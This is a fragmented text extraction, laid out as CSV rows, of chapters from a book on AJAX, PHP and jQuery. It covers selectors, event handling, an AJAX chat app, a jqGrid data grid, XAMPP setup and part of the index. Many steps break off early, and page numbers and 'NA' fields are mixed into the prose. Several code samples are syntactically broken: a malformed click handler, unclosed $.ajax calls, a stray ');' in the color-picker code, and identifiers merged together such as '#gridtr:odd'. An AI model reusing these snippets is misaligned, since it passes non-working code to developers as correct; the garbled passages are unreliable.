Larger Text,Smaller Text,Symbol
Before we get started,"In order to be able to develop anything, we need to include the jQuery framework in 
 our application. jQuery consists of a single file that can be downloaded from 
 www.jquery.com
 . It comes in two formats:
  
 •
  
 •
  
 Minified
 —this version has a very small download footprint; it is obfuscated and 
 should be used for production
  
 Uncompressed
 —this version is bigger; it is readable and should be used 
 for development
  
 Including the framework file in our page is as simple as writing the following line of 
 code in the head section of our page:
  
 <head> 
  
  <script type=""text/javascript"" src=""jquery-1.3.2.js"" ></script>
  
 </head>
  
 This piece of code includes the development version of jQuery. Including the 
 production version simply involves replacing 
 jquery-1.3.2.js
  with 
 jquery-1.3.2.min.js
 .",NA
The first steps,"When it comes to DOM programming, things are not simple at all. Using pure 
 JavaScript to deal with all the differences between browsers is a nightmare even for 
 experienced programmers. jQuery hides all those nasty bits, providing a browser-
 agnostic API, making DOM programming a breeze.
  
 There are a few core concepts key for using jQuery. Let's take a look at them!",NA
jQuery DOM Selectors,"Before we go to the core function of jQuery, it is important to know that its selectors allow 
 us to select multiple DOM elements so that we can manipulate them further on using 
 additional operational methods. The most important part is that selectors use CSS 3.0 
 syntax so that you can use the same syntax you were used to or even if you don't know it, 
 the learning curve is easy.
  
 Using CSS syntax we can select elements by their ID, CSS class, relationship to other 
 elements (parent, children, siblings), or even attribute filters.
  
 For example, 
 #gridtr:odd
  retrieves all the odd rows in a grid table.
  
 [
  225 
 ]",NA
jQuery wrapper object,"The entry point to the jQuery framework is the 
 jQuery()
  function. For convenience, it 
 also has an alias 
 $()
 .
  
 jQuery = window.jQuery = window.$ = function( selector, context ) {
  
  
  // The jQuery object is actually just the init constructor 
 'enhanced'
  
  return new jQuery.fn.init( selector, context );
  
  }
  
 As we can see 
 jQuery()
 , 
 window.jQuery()
  and 
 window.$()
  all point to the same 
 anonymous function that actually creates the 
 jQuery
  object.
  
 The first parameter typically is a selector string allowing us to define an expression for 
 getting the DOM elements we want. 
  
 The second parameter is optional and points to the context the selector should be 
 evaluated against. By default, if missing, the context refers to the current HTML 
 document. It can contain a DOM element or a jQuery object.
  
 The most important part is that the 
 jQuery()
  function also returns a jQuery object 
 allowing for chained method calls. The resulting DOM elements after applying the 
 selector are not returned as such, being wrapped in a jQuery object.
  
 For the above selector, the complete jQuery syntax for adding a specific CSS class to 
 them is:
  
 $(""#grid tr:odd"").addClass(""gridodd"")
  
 The object just created has a handful of methods that allow us to work with the DOM in a 
 transparent and elegant manner.
  
 If you are looking for a quick reference, check out this cheat sheet:
  
 •
  
 http://www.javascripttoolbox.com/jquery/cheatsheet/
  
 [
  226 
 ]",NA
Method chaining ,"Method chaining is a programming technique where a class has many methods, each of 
 which returns the object itself.
  
 Method chaining is the approach for jQuery, as it has a lot of methods and most of them 
 return a jQuery wrapper object allowing for chaining calls to several methods of the 
 jQuery object.
  
 In the previous example, an additional CSS class was added to the selected table rows 
 returned by the CSS selector passed to the 
 jQuery()
  function.
  
 By using this technique we get a much cleaner and expressive code.",NA
Event handling ,"Dealing with events in different browsers can be quite a nightmare but jQuery offers a 
 simple, consistent, and efficient way to handle and to raise events.
  
 jQuery provides the 
 bind()
  and 
 unbind()
  high-level functions allowing the attaching 
 and detaching of event handlers to matched elements. The list of possible events is quite 
 comprehensible: 
 blur,focus,load,resize,scroll,unload, 
 beforeunload,click,dblclick,mousedown,mouseup,mousemove,mouseover, 
 mouseout,mouseenter,mouseleave,change,select,submit,keydown, 
 keypress,keyup,error,ready
 .
  
 The 
 one()
  function behaves like 
 bind
  except that the handler is executed only once for 
 each matching element.
  
 Common events like those listed above have also their own handler functions. The 
 handler function has a simple parameter representing the event.
  
 $('#elm').click(function(e)) 
  
 {
  
  alert('I was clicked!'); 
  
 }
  
 [
  227 
 ]",NA
A simple example ,"Back in Chapter 5, 
 AJAX Form Validation
 , we built a simple object that abstracts all the 
 AJAX queries under a simple API. When it came to work with the DOM elements for 
 populating the page with the results, we used raw JavaScript to retrieve a HTML element 
 and set its 
 innerHTML
  property:
  
  XmlHttp
  
  
  ({url:'async.txt',
  
  
  complete:function(xhr,response,status)
  
    
  {        
  
     
  document.getElementById(""test"").innerHTML = response;
    
  }
  
  
  });
  
 Things get smoother with jQuery:
  
 $.ajax({
  
  url: 'async.txt',
  
  dataType: 'html',
  
  success: function(data, textStatus) {
  
  
  
  $('#test').html(data); 
  
 } 
  
 [
  228 
 ]",NA
Basic concepts,"Provided that you're already familiarized with the OOP features in JavaScript (you've 
 learned about these features in Chapter 3, 
 Object Oriented JavaScript
 ), here are a few 
 basics to keep in mind:
  
 •
  
 •
  
 •
  
 $
  operates as an alias for the 
 jQuery
  namespace. Rather than using 
 jQuery.function()
 , you can simply use 
 $.function()
 . If at some point 
 you want the 
 $
  to function as a 
 $
  and not a namespace reference for jQuery, 
 you will need to override this using 
 jQuery.noConflict()
 . Alternatively, 
 you could instead define your own nickname for jQuery by defining it as a 
 variable and assigning its value to the function, as in 
 varnn=jQuery.noConflict()
 .
  
 Typically, jQuery is implemented as a solitary file with all of the other elements 
 (DOM, AJAX, events) within this single file, which is then included in the 
 <head>
  
 element of the HTML document.
  
 jQuery functions (commands) can be chained together. This offers you the 
 powerful ability to select elements/objects, filter them, extend them, take 
 action on them, change their appearance, and so on in a chain.
  
 Having just touched on jQuery won't suffice when you need to develop complex jQuery 
 applications. The following links should get you digging in and picking up speed pretty 
 quickly (they're worth the time!):
  
 •
  
 http://docs.jQuery.com/Tutorials
  
 •
  
 http://www.west-wind.com/presentations/jQuery/
  
 •
  
 http://www.learningjQuery.com/
  
 If you're more inclined to sit by the fire with a book, you'll like these:
  
 •
  
 •
  
 •
  
 •
  
 jQuery Reference Guide
 –
 A Comprehensive Exploration of the Popular JavaScript 
 Library
  by Karl Swedberg and Jonathan Chaffer, Packt Publishing 
  
 Learning jQuery 1.3 
 by Karl Swedberg and Jonathan Chaffer, Packt Publishing 
 jQuery UI 1.6: The User Interface Library for jQuery
  by Dan Wellman, 
  
 Packt Publishing 
  
 jQuery in Action
  by Bear Bibeault, Yehuda Katz, Manning Publications
  
 [
  229 
 ]",NA
AJAX chat,"Now, it's time to implement the AJAX chat application. We'll keep the application simple, 
 modular, and extensible. We won't implement a login module, support for chat rooms, 
 the online users list, and so on. By keeping it simple we'll focus on what the goal of this 
 chapter is: posting and retrieving messages without causing any page reloads. We'll also 
 let the user pick a color for her or his messages, because this involves an AJAX 
 mechanism that is another good exercise.
  
 The chat application can be tested online at 
 http://ajaxphp.packtpub.com
 , and 
 should look like Figure 8-1:
  
  
 Figure 8-1: Online chat application built with AJAX and jQuery
  
 Using jQuery as a framework will simplify things: we won't need to worry about 
 constructing 
 XmlHttpRequest
  by ourselves and implementing design patterns and 
 best practices. 
  
 [
  230 
 ]",NA
The chat application,"Here we use a MySql database and AJAX to store and retrieve the users' messages and 
 pass them between the client and the server. The chat window contacts the server 
 periodically to send and retrieve the newest posted messages from the server to each 
 user. Our DB will also hold username and text color information used in the application.
  
 Implementing this functionality involves creating the files and structures shown in the 
 following figure:
  
 Ajax Chat Client
  
 Ajax Chat Server
  
 MySQL database
  
 ajax database
  
 index.html
  
 chat.php
  
 chat.js
  
 chat.class.php
  
 chat data table
  
 jQuery-1.3.2js
  
 color.php
  
 chat.css
  
 config.php
  
 palette.png
  
 error_handler.php
  
 Figure 8-2: The components of the AJAX Chat application
  
 [
  231 
 ]",NA
Time for action – implementing AJAX chat with JSON ,"Follow these steps to implement your AJAX Chat application:
  
 1. First we need the database that will hold our user information. Connect to the 
 ajax
  database, and create a table named 
 chat
  with the following code:
  
 CREATE TABLE chat 
  
 ( 
  
 chat_id int(11) NOT NULL 
 auto_increment, 
  
 posted_on datetime NOT NULL, 
  
 user_name varchar(255) NOT NULL, 
  
 message text NOT NULL, 
  
 color char(7) default '#000000', 
  
 PRIMARY KEY (chat_id) 
  
 );
  
 2. In your 
 ajax
  folder, create a new folder named 
 chat
 .
  
 [
  233 
 ]",NA
What just happened?,"First, make sure the application works well. Load 
 http://localhost/ajax/chat/ 
 index.html
  with a web browser, and you should get a page that looks like the one in 
 Figure 8-1. 
  
 If you analyze the code for a bit, the details will become clear. Everything starts with 
 index.html
 . The only part that is really interesting in 
 index.html
  is a scrolling region 
 implemented in DHTML. (A little piece of information regarding scrolling can be found at 
 http://www.dyn-web.com/code/scroll/
 .)
  
 The scrolling area allows our users to scroll up and down the history of the chat and 
 ensures that any new messages that might flow out of the area are still viewed. In our 
 example, the 
 scroll<div>
  element and its inner layers do the trick. The 
 scroll 
 element 
 is the outermost layer; it has a fixed 
 width
  and 
 height;
  and its most useful property, 
 overflow,
  determines how any content that falls (or overflows) outside of its boundaries 
 is displayed. Generally, the content of a block box is confined to the content edges of the 
 box. In CSS, the 
 overflow
  property has four possible values that specify what should 
 happen when an element overflows its area: visible, hidden, scroll, and auto. (For more 
 details, please see the specification of overflow, at 
 http://www.w3.org/TR/REC-
 CSS2
 /visufx.html
 .) 
  
 As you can see, the HTML file is very clean. It contains only the declarations of the 
 HTML elements that make up the user interface. There are no event handlers and 
 there is no JavaScript code inside the HTML file—we have a clean separation 
 between the user interface and the programming. 
  
 [
  249 
 ]",NA
How does the color picker work?,"Here we use AJAX to call the PHP script that can tell us which text color was chosen by the 
 user from the color palette. We use an image containing the entire spectrum of colors and 
 allow the user choose any color for the text he or she writes. When the user clicks on the 
 palette, the mouse coordinates are sent to the server, which obtains the color code, stores 
 it in the user's DB entry, and sets the user's test to that color.
  
 This part, which might seem pretty difficult, actually proves to be easy to implement. The 
 relative position of the pixel in the palette is retrieved in the JavaScript code:
  
 // handle the click event on the image
  
  $('#palette').click(
  
  
  
  function(e) {
  
  
   
  // http://docs.jQuery.com/Tutorials:Mouse_Position        
  
   
  // retrieve the relative mouse position inside the image
  
   
  var x = e.pageX - $('#palette').position().left;
  
  
   
  var y = e.pageY - $('#palette').position().top;
  
  
   
  );
  
  
  
  }
  
  );
  
 Inside the same handler, we make an AJAX request and retrieve the 
  
 corresponding RGB color using the 
 color.php
  server-side page that contains the 
 necessary functionality:
  
 // make the ajax request to get the RGB code
  
  $.ajax({
  
  
  url: 'color.php',
  
  
  success: function(data, textStatus) {
  
  
  
  
  if(data.errno != null)
  
  
  
  
   
  displayPHPError(data);
  
  
  
  
  
  else
  
  
  
  
  
  {
  
  
  
  
   
  $('#color')[0].value = data.color;
  
  
  
  
   
  $('#sampleText').css('color', 
 data.color);
   
   
  }
  
 [
  257 
 ]",NA
Summary,"At the beginning of the chapter, we saw why one can face problems when 
  
 communicating with other people in a dynamic way over the Internet. We saw what the 
 solutions for these problems are and how AJAX chat solutions can bring something new, 
 useful, and ergonomic. After seeing some other AJAX chat implementations, we started 
 building our own solution. Step by step, we have implemented our AJAX chat solution, 
 keeping it simple, easily extensible, and modular.
  
 After reading this chapter, you can try improving the solution, by adding new 
 features such as:
  
 •
  
 •
  
 •
  
 Chat rooms 
  
 Simple command lines (joining/leaving a chat room, switching between chat 
 rooms) 
  
 Private messaging
  
 [
  259 
 ]",NA
AJAX Grid,"One of the most common ways to render data is in the form of a data grid. Grids are used 
 for a wide range of tasks from displaying address books to controlling inventories and 
 logistics management. Because centralizing data in repositories has multiple advantages 
 for organizations, it wasn't long before a large number of applications were being built 
 to manage data through the Internet and intranet applications by using data grids. But 
 compared to their desktop cousins, online applications using data grids were less than 
 stellar—they felt cumbersome and time consuming, were not always the easiest things 
 to implement (especially when you had to control varying access levels across multiple 
 servers), and from a usability standpoint, time lags during page reloads, sorts, and edits 
 made online data grids a bit of a pain to use, not to mention the resources that all of this 
 consumed. 
  
 As you are a clever reader, you have undoubtedly surmised that you can use AJAX to 
 update the grid content; we are about to show you how to do it! Your grids can update 
 without refreshing the page, cache data for manipulation on the client (rather than asking 
 the server to do it over and over again), and change their looks with just a few keystrokes! 
 Gone forever are the blinking pages of partial data and sessions that time out just before 
 you finish your edits. Enjoy!
  
 In this chapter, we're going to use a jQuery data grid plugin named jqGrid. jqGrid is 
 freely available for private and commercial use (although your support is 
  
 appreciated) and can be found at: 
 http://www.trirand.com/blog/
 . You may have 
 guessed that we'll be using PHP on the server side but jqGrid can be used with any of the 
 several server-side technologies. On the client side, the grid is implemented using 
 JavaScript's jQuery library and JSON. The look and style of the data grid will be 
 controlled via CSS using themes, which make changing the appearance of your grid easy 
 and very fast. Let's start looking at the plugin and how easily your newly acquired AJAX 
 skills enable you to quickly add functionality to any website.",NA
Implementing the AJAX data grid ,"The files and folders for this project can be obtained directly from the code download for 
 this chapter, or can be created by typing them in. 
  
 We encourage you to use the code download to save time and for accuracy. If you 
 choose to do so, there are just a few steps you need to follow:
  
 1. Copy the 
 grid
  folder from the code download to your 
 ajax
  folder.
  
 2. Connect to your 
 ajax
  database and execute the 
 product.sql
  script.
  
 3. Update 
 config.php
  with the correct database username and password. 4. Load 
 http://localhost/ajax/grid
  to verify the grid works fine—it should 
  
 look just 
 like Figure 9-1.
  
 [
  262 
 ]",NA
Code overview,"If you prefer to type the code yourself, you'll find a complete step-by-step exercise 
  
 a bit later in this chapter. Before then, though, let's quickly review what our grid is 
  
 made of. We'll review the code in greater detail at the end of this chapter.
  
 The editable grid feature is made up of a few components:
  
 •
  
 product.sql
  is the script that creates the grid database
  
 •
  
 config.php
  and 
 error_handler.php
  are our standard helper scripts
  
 •
  
 grid.php
  and 
 grid.class.php
  make up the server-side functionality
  
 [
  263 
 ]",NA
The database,"Our editable grid displays a fictional database with products. On the server side, we 
 store the data in a table named 
 product
 , which contains the following fields:
  
 •
  
 •
  
 •
  
 •
  
 product_id
 : A unique number automatically generated by auto-increment in 
 the database and used as the Primary Key 
  
 name
 : The actual name of the product 
  
 price
 : The price of the product for sale 
  
 on_promotion
 : A numeric field that we use to store 
 0
 /
 1
  (or true/false) 
 values. In the user interface, the value is expressed via a checkbox
  
 The Primary Key is defined as the 
 product_id
 , as this will be unique for each product it 
 is a logical choice. This field cannot be empty and is set to auto-increment as entries are 
 added to the database:
  
 CREATE TABLE product
  
 (
  
  product_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
  
  name VARCHAR(50) NOT NULL DEFAULT '',
  
  price DECIMAL(10,2) NOT NULL DEFAULT '0.00',
  
  on_promotion TINYINT NOT NULL DEFAULT '0',
  
  PRIMARY KEY (product_id)
  
 );
  
 The other fields are rather self-explanatory—none of the fields may be left empty and 
 each field, with the exception of 
 product_id,
  has been assigned a default value. The 
 tinyint
  field will be shown as a checkbox in our grid that the user can simply set on or 
 off. The 
 on-promotion
  field is set to 
 tinyint
 , as it will only need to hold a true (
 1
 ) or 
 false (
 0
 ) value.
  
 [
  264 
 ]",NA
Styles and colors,"Leaving the database aside, it's useful to look at the more pertinent and immediate 
 aspects of the application code so as to get a general overview of what's going on here.
  
 We mentioned earlier that control of the look of the grid is accomplished through 
 CSS. Looking at the 
 index.html
  file's 
 head
  region, we find the following code:
  
 <link rel=""stylesheet"" type=""text/css"" href=""scripts/themes/coffee/ 
 grid.css"" title=""coffee"" media=""screen"" /> 
  
 <link rel=""stylesheet"" type=""text/css"" media=""screen"" href=""themes/ 
 jqModal.css"" />
  
 Several themes have been included in the 
 themes
  folder; 
 coffee
  is the theme being 
 used in the code above. To change the look of the grid, you need only modify the theme 
 name to another theme, 
 green
 , for example, to modify the color theme for the entire 
 grid. Creating a custom theme is possible by creating your own images for the grid 
 (following the naming convention of images), collecting them in a folder under the 
 themes folder, and changing this line to reflect your new theme name. There is one 
 exception here though, and it affects which buttons will be used. The buttons' 
 appearance is controlled by imgpath: '
 scripts/themes/green/images
 ', found in 
 index.html
 ; you must alter this to reflect the path to the proper theme.
  
 Changing the theme name in two different places is error prone and we should do this 
 carefully. By using jQuery and a nifty trick, we will be able to define the theme as a 
 simple variable. We will be able to dynamically load the CSS file based on the current 
 theme and imgpath will also be composed dynamically. 
  
 The nifty trick involves dynamically creating the <link> tag inside head and setting the 
 appropriate href attribute to the chosen theme. 
  
 Changing the current theme simply consists of changing the theme JavaScript variable.
  
 JqModal.css
  controls the style of our pop-up or overlay window and is a part of the 
 jqModal plugin. (Its functionality is controlled by the file 
 jqModal.js
  found in the 
 scripts/js
  folder.) You can find the plugin and its associated CSS file at: 
 http://dev.iceburg.net/jquery/jqModal/
 .
  
 In addition, in the head region of 
 index.html
 , there are several 
 scriptsrc 
 declarations for the files used to build the grid (and 
 jqModal.js
  for the overlay):
  
 <script src=""scripts/jquery-1.3.2.js"" 
  
  
  type=""text/javascript""></script> 
  
 <script src=""scripts/jquery.jqGrid.js"" 
  
  
  type=""text/javascript""></script> 
  
 <script src=""scripts/js/jqModal.js"" type=""text/javascript""></script> 
 <script src=""scripts/js/jqDnR.js"" type=""text/javascript""></script>
  
 [
  265 
 ]",NA
The server side,"The code at the server side is made up of 
 grid.php
  and 
 grid.class.php
 . The 
 former is a simple script that receives 
 load
  and 
 save
  requests from the client. Its 
 structure is something like the following:
  
 <?php
  
 ... initialization
  
 // load the grid
  
 if($action == 'load')
  
 {
  
  ... load the grid here
  
 }
  
 // save the grid data
  
 elseif ($action == 'save')
  
 {
  
  ... save the grid here
  
 }
  
 ?>
  
 [
  267 
 ]",NA
"Creating the grid, step by step","If you prefer to write the code yourself, just follow these steps:
  
 1. Before we do anything, we'll need some data to work with. Create your 
 products table executing the following SQL code in phpMyAdmin. (For 
 briefness, we included here only a few of the product entries that you can 
 find in the downloadable version.)
  
 USE ajax;
  
 CREATE TABLE product 
  
 (
  
  
  product_id INT UNSIGNED NOT NULL AUTO_INCREMENT,
  
  
  name VARCHAR(50) NOT NULL DEFAULT '',
  
  
  price DECIMAL(10,2) NOT NULL DEFAULT '0.00',
  
  
  on_promotion TINYINT NOT NULL DEFAULT '0',
  
  
  PRIMARY KEY (product_id) 
  
 ); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Santa 
 Costume', 14.99, 0); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Medieval 
 Lady', 49.99, 1); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Caveman', 
 12.99, 0); 
  
 INSERT INTO product(name, price, on_promotion) VALUES('Costume 
 Ghoul', 18.99, 0);
  
 [
  268 
 ]",NA
Summary,"As with all endeavors, the more time you spend actually practicing it, the more 
 adept you become—AJAX is no exception. We've endeavored to give you the tools 
 you need to jump right in and begin putting them to good use—either creating sites 
 from scratch or maintaining and updating an existing application. 
  
 With a solid understanding of the mechanics behind the magic, you are well on 
 your way to success. 
  
 We're always pleased to hear from our readers and glimpse the projects that they've 
 implemented using our materials—feel free to drop us a note and let us know what 
 you're working on! We hope you have enjoyed learning AJAX with us—it has been our 
 privilege to take the journey with you!
  
 [
  277 
 ]",NA
Preparing Your Working ,NA,NA
Environment,"In this appendix, we'll cover the installation instructions that set up your machine for the 
 exercises in this book. You'll find separate installation instructions for Windows and *NIX-
 based machines. We'll also cover preparing the database that is used in many examples 
 throughout the book.
  
 To build websites with AJAX and PHP, you will need (quite unsurprisingly) to install 
 PHP
 . You also need a web server. We will cover installing 
 Apache
 , which is the web 
 server preferred by most PHP developers and web hosting companies. 
  
 Because we've tried to make the examples in this book as relevant as possible for real-
 world scenarios, many of them need a database. In this book, we cover 
 MySQL
 , which is 
 the most popular database server in the PHP world. Because we used simple SQL code, 
 you can easily use another database server without major code changes, or older 
 versions of MySQL. Finally, we'll be using 
 phpMyAdmin
 , which is a very useful web tool 
 for administering your databases. You'll then learn how to use this tool to create a new 
 database, and then a database user with full privileges to this database.
  
 After installing all the necessary software, we'll create a new 
 database
  and a new 
 database user
  using phpMyAdmin.",NA
Installing XAMPP,"XAMPP is a package created by Apache Friends (
 http://www.apachefriends.org
 ), 
 which includes Apache, PHP, MySQL, and many other goodies. If you don't have these 
 already installed on your machine, the easiest way to have them running is to install 
 XAMPP. XAMPP ships in Linux, Windows, Mac OS X, and Solaris versions.
  
  
 Our web-hosting friends at 
 http://nexcess.net
  are offering special 
  
  
 discount prices for the readers of this book. Their servers are also 
  
 configured to run the examples in this book.
  
 Follow the steps of the exercise in the next section to install XAMPP on your Windows 
 machine. The installation instructions for Linux are presented afterward, in a separate 
 exercise. Mac OS X users can find their version of the software, together with 
 installation instructions, at 
 http://www.apachefriends.org/en/ xampp-
 macosx.html
 .
  
 For more information about installing XAMPP, you can check out its Installation wiki 
 page at 
 http://www.installationwiki.org/XAMPP
 .",NA
Installing XAMPP on Windows,"Here are the steps that you should follow:
  
 1. Visit 
 http://www.apachefriends.org/en/xampp-windows.html
 , and 
 download the 
 XAMPPLite
  installer package, which should be an executable file 
 named something like 
 xampplite-win32-version-installer.exe
 .
  
 Windows Vista users should take note of the 
 Vista note
  on the page, 
 which reads:
  
 Because of missing or insufficient write permissions in 
  
 C:\Program Files, we recommend to use alternate folder for XAMPP 
 (C:\xampp or C:\meinverzeichnis\xampp).
  
 [
  280 
 ]",NA
Installing XAMPP on Linux,"Here are the steps you should follow:
  
 1. Visit 
 http://www.apachefriends.org/en/xampp-linux.html
 , and 
 download the XAMPP package, which should be an archive file named 
 something like 
 xampp-linux-X.Y.Z.tar.gz
 .
  
 2. Execute the following command from a Linux shell logged as the system 
  
 administrator root:
  
 tar xvfz xampp-linux-X.Y.Z.tar.gz -C /opt
  
 This will extract the downloaded archive file to 
 /opt
 .
  
  
 You can't have more web servers working on port 80 (the default port 
  
  
 used for HTTP communication). If you already have a web server on your 
  
 machine, you should make it use another port, uninstall it, or deactivate 
  
 it. Otherwise, Apache won't work. To make Apache work on another 
  
 port, you should edit 
 /opt/lampp/etc/httpd.conf
 , locate the lines 
  
 containing Listen 80 and ServerName localhost:80, and replace the value 
  
 80
  with the port number of your choice (usually the 
 8080
  is used). 
  
 3. To start XAMPP, simply call the following command:
  
 /opt/lampp/lampp start
  
 To restart XAMPP, replace 
 start
  in the previous command with 
 restart
 , and 
 to stop XAMPP, replace it with 
 stop
 .
  
 4. To test that Apache installed correctly, load 
 http://localhost/ 
  
 (or 
 http://localhost:8080/
  if Apache works on port 8080) using your web 
 browser. An XAMPP welcome screen, like the one in the previous screenshot, 
 should load.
  
 [
  283 
 ]",NA
Preparing the AJAX database,"As an exercise for both using phpMyAdmin and working with MySQL, let's create a 
 database called 
 ajax
 , and create a MySQL user with full privileges to this database. 
  
 You'll use this database and this user for all the exercises in this book. Follow 
 these steps:
  
 1. Load 
 http://localhost/phpmyadmin
  in your web browser. 
  
 2. Write 
 ajax
  in the 
 Create a new database
  box, and then click on the 
 Create 
 button. The confirmation screen should look like the following screenshot:
  
  
 3. phpMyAdmin doesn't have the visual tools to create new users, so you'll need to 
 write some SQL code now. You need to create a user with full access to the 
 ajax
  
 database, which will be used in all the case studies throughout the book. This user 
 will be called 
 ajaxuser
 , and its password will be 
 practical
 . 
  
 To add this user, click on the 
 SQL
  tab at the top of the page, and write the 
 following code in it: 
  
 GRANT ALL PRIVILEGES ON ajax.* 
  
 TO ajaxuser@localhost IDENTIFIED BY ""practical""
  
 [
  284 
 ]",NA
Index,NA,NA
Symbols,"$_POST array  181
  
  _ _construct() method  180 
  
 __destruct() method  180 
  
 <script> element 
  
  
 using  45",NA
A,"abort() method, XMLHttpRequest  60 
  
 AJAX 
  
  
 about  9, 14, 113 
  
  
 and Web 2.0  9 
  
  
 asynchronous file upload  208 
  
  
 benefits  18 
  
  
 components  16 
  
  
 database, preparing  284, 285 
  
  
 data grid  261 
  
  
 enabled web page, requesting  14 
  
  
 features  15 
  
  
 JavaScript  36 
  
  
 potential problems  18 
  
  
 resources  19 
  
  
 simple quickstart application, building  20 
  
 tools, Dojo  19 
  
  
 tools, jQuery  19 
  
  
 tools, Prototype  19 
  
  
 web registration forms, implementing 
  
  
 14, 15 
  
 AJAX chat 
  
  
 about  223 
  
  
 jQuery, using  224 
  
  
 Meebo  224 
  
 AJAX chat application
  
  
  
 about  231 
  
  
 chat.class.php file  232, 233 
  
  
 color picker, working  257, 258 
  
  
 implementing  230 
  
  
 implementing, JSON used  233-256 
  
 on server-side file  232 
  
  
 testing  230 
  
 AJAX, components 
  
  
 PHP  17 
  
  
 XMLHttpRequest object  16 
  
 AJAX data grid 
  
  
 code download, choosing  262, 263 
 AJAX form validation 
  
  
 AJAX-style, client side  148 
  
  
 allok.php, creating  167 
  
  
 application rules  148 
  
  
 blur event  177 
  
  
 config.php  159 
  
  
 config.php, creating  168 
  
  
 error handler code, creating  169 
  
  
 error_handler.php  159 
  
  
 implementing  146, 149, 159 
  
  
 index.php  159, 177 
  
  
 index.php, creating  163-167 
  
  
 index_top.php  159 
  
  
 index_top.php, creating  161, 163 
  
 INSERT commands, executing  160 
  
 json2.js  159 
  
  
 JSON setting, building  178 
  
  
 on server  147 
  
  
 PHP-style (server side)  148 
  
  
 span element  178 
  
  
 Validate class  170 
  
  
 validate.class.php  159 
  
  
 validate.class.php script file  170-176 
  
 validate.css  159",NA
B,"base class  84 
  
 Bing Maps  15 
  
 browser-side caching pattern  202 
 browser-side templating pattern  
 202",NA
C,"Call Tree  192 
  
 call stack 
  
  
 about  191 
  
  
 onload() function  192 
  
  
 process() function  192 
  
  
 Profiler tab  192 
  
  
 Start Profiling button  192 
  
  
 Stop Debugging button  192 
  
  
 Stop Profiling button  192 
  
 Cascading Style Sheets. 
 See
   CSS 
 child. 
 See
   derived class
  
 class  82 
  
 className property  179 
  
 client-side technologies 
  
  
 Flash  13 
  
  
 Java applets  13 
  
  
 Macromedia Flash  13 
  
  
 Microsoft Silverlight  13 
  
 closures  86 
  
 code, AJAX data grid 
  
  
 colors  265, 266 
  
  
 creating, steps  268-276 
  
  
 database  264 
  
  
 editable grid, components  263 
  
  
 on-promotion field  265 
  
  
 product_id field  264 
  
  
 server-side  267 
  
  
 styles  265 
  
 code combining pattern  203 
  
 code compression pattern  202 
  
 constructor  93, 94 
  
 Continue command (F5)  191 
  
 createXmlHttpRequestObject() function 
  
 about  30, 55, 58 
  
  
 upgraded version  59 
  
 cross-domain calls 
  
  
 about  216 
  
  
 using Flash  216 
  
  
 using iframes  217 
  
  
 using JSONP  217 
  
  
 using server proxy  216 
  
 Cross-Domain Proxy pattern  202 
  
 cross site request forgery. 
 See
   CSRF 
 Cross site scripting. 
 See
   XSS 
  
 CSRF 
  
  
 about  218 
  
  
 JSON hijacking  219 
  
  
 mitigating  219 
  
 CSS 
  
  
 about  35 
  
  
 and JavaScript, working with  50",NA
D,"database   279 
  
 database connection, MySQL 
  
 about  139 
  
  
 ajaxuser  139
  
 [
  288 
 ]",NA
E,"encapsulation, OOP 
  
  
 private members  84 
  
  
 public interface  83 
  
 environment 
  
  
 code editor, recommendations  20 
 Error Console  40 
  
 error_handler.php  131 
  
 error_handler.php script  129 
  
 errors, PHP 
  
  
 displaying, to users  134 
  
  
 error_handler.php  129, 131 
  
  
 handling, steps  124-128 
  
 event handling, jQuery 
  
  
 bind function  227 
  
  
 hover function  228 
  
  
 one function  227 
  
  
 ready function  228 
  
  
 toggle function  228 
  
  
 trigger function  228 
  
  
 unbind function  227 
  
 events, JavaScript 
  
  
 about  41 
  
  
 and DOM, using  43 
  
  
 onload event  45 
  
 execution context, JavaScript 
  
  
 about  103 
  
  
 eval() execution context  103 
  
  
 function execution context  103 
  
 global execution context  103 
  
  
 right context, using  105, 107 
  
  
 this.x  104
  
 [
  289 
 ]",NA
F,"fetch_array() method  144 
  
 Firebug 
  
  
 activities  195 
  
  
 Continue commands  196 
  
  
 JavaScript, debugging  196 
  
  
 Step Out command  196 
  
  
 Step Over command  196 
  
 Firebug Lite  193 
  
 Firefox 
  
  
 debugging  195 
  
  
 Firebug  195 
  
  
 profiling  195 
  
  
 Venkman JavaScript debugger  197 
  
  
 Web Developer  199 
  
 Firefox JavaScript console, error handling 
   
 78 
  
 Flash 
  
  
 cross-domain calls  216 
  
 Flickr  15 
  
 Functions  192",NA
